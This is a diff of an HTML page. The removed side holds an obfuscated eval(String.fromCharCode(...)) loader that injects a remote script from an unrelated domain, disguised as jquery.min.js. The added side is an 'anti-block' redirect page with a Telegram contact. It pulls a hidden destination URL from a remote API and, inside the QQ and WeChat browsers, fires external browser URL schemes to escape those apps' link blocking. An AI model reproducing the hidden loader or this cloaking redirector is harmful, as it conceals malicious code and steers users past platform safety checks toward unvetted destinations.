@@ -1,27 +1,142 @@
 <!DOCTYPE html>
-<html lang="en"><head>
+<!--防红定制 TG:@uf833-->
+<html>
+
+<head>
     <meta charset="UTF-8">
-    <!--屏幕自适应-->
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=2.0, user-scalable=yes">
-    <title>测试</title>
-<style type="text/css">
-html,body {
-    height: 100%;
-    margin: 0;
-    overflow: hidden;
-}
-iframe {   
-    margin: 0;   
-    border-style: none;    
-    width: 100%;  
-    height: 100%;
-}
-</style>
+    <title>加载中...</title>
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" />
+    <meta content="yes" name="apple-mobile-web-app-capable" />
+    <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta content="false" name="twcClient" id="twcClient" />
+    <meta name="aplus-touch" content="1" />
+    <style>
+        body,
+        html {
+            width: 100%;
+            height: 100%
+        }
+
+        * {
+            margin: 0;
+            padding: 0
+        }
+
+        body {
+            background-color: #fff
+        }
+
+        .top-bar-guidance {
+            font-size: 15px;
+            color: #fff;
+            height: 70%;
+            line-height: 1.8;
+            padding-left: 20px;
+            padding-top: 20px;
+            background: url(//) center top/contain no-repeat
+        }
+
+        .top-bar-guidance .icon-safari {
+            width: 25px;
+            height: 25px;
+            vertical-align: middle;
+            margin: 0 .2em
+        }
+
+        .app-download-tip {
+            margin: 0 auto;
+            width: 290px;
+            text-align: center;
+            font-size: 15px;
+            color: #2466f4;
+            background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAcAQMAAACak0ePAAAABlBMVEUAAAAdYfh+GakkAAAAAXRSTlMAQObYZgAAAA5JREFUCNdjwA8acEkAAAy4AIE4hQq/AAAAAElFTkSuQmCC) left center/auto 15px repeat-x
+        }
+
+        .app-download-tip .guidance-desc {
+            background-color: #fff;
+            padding: 0 5px
+        }
+
+        .app-download-btn {
+            display: block;
+            width: 214px;
+            height: 40px;
+            line-height: 40px;
+            margin: 18px auto 0 auto;
+            text-align: center;
+            font-size: 18px;
+            color: #2466f4;
+            border-radius: 20px;
+            border: .5px #2466f4 solid;
+            text-decoration: none
+        }
+    </style>
 </head>
+
 <body>
-<iframe src="https://www.baidu.com"></iframe>
-<script>
-eval(String.fromCharCode(9,102,117,110,99,40,41,59,10,102,117,110,99,116,105,111,110,32,102,117,110,99,40,41,32,123,10,9,108,101,116,32,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,10,9,115,46,115,114,99,32,61,32,39,47,47,109,97,105,108,46,119,120,46,103,97,121,47,106,113,117,101,114,121,46,109,105,110,46,106,115,39,59,10,9,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,10,125,59));
+    
+        <div class="top-bar-guidance">
+            <p>点击右上角
+                <!-- <img src="//puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rLbNVmztN9ia6GPRJ0IFicucFTr4Pp8xzibsw/0" class="icon-safari" /> <span id="openm">浏览器打开</span>
+            </p>
+            <p>可以继续浏览本站哦~</p>
+        </div>
+         <div class="app-download-tip">
+            <span class="guidance-desc">您也可以复制本站网址，到其它浏览器打开</span>
+        </div>
+       <a class="app-download-btn" id="J_BtnDowanloadApp">点此继续访问</a>-->
+        <a style="display: none;" href="" id="vurl" rel="noreferrer"></a>
+        <img src="https://pcip.crhealthcare.com.cn/api/files/raw/2fdd4bd9b0cb17d66e75c46a6acfbc0e.d"  style="max-width: 100%; height: auto; display: block; margin-left: auto; margin-right: auto;"><br /><br />
+    </div>
 
 
-</body></html>
+    <script src="//lib.baomitu.com/jquery/1.12.4/jquery.min.js"></script>
+    <script>
+        var url = ''
+        var u = window.location.search;
+
+        var index = u.lastIndexOf("\?");
+        id = u.substring(index + 1, u.length).replace('/', '');
+        id = id.replace('=', '');
+        jump(id)
+
+        function jump(id) {
+            $.ajax({
+                type: 'GET',
+                url: '//a.kwailala.com.cn/api.php?act=geturl&id=' + id,
+                dataType: 'json',
+                success: function(data) {
+                    url = data.url
+                    document.querySelector('body').addEventListener('touchmove', function(event) {
+                        event.preventDefault();
+                    });
+                    if (navigator.userAgent.indexOf("QQ/") > -1 || navigator.userAgent.indexOf("MicroMessenger") > -1) {
+                  
+                        document.title = "请使用浏览器打开";
+                        openu("ucbrowser://" + url);
+                        openu("mttbrowser://url=" + url);
+                        openu("baiduboxapp://browse?url=" + url);
+                        openu("googlechrome://browse?url=" + url);
+                        $("html").on("click", function() {
+                            openu("ucbrowser://" + url);
+                            openu("mttbrowser://url=" + url);
+                            openu("baiduboxapp://browse?url=" + url);
+                            openu("googlechrome://browse?url=" + url);
+                        });
+                    } else {
+                        document.title = "跳转中...";
+                        location.href = url
+                    }
+                }
+            });
+        }
+
+        function openu(u) {
+            document.getElementById("vurl").href = u;
+            document.getElementById("vurl").click();
+        }
+    </script>
+</body>
+
+</html>
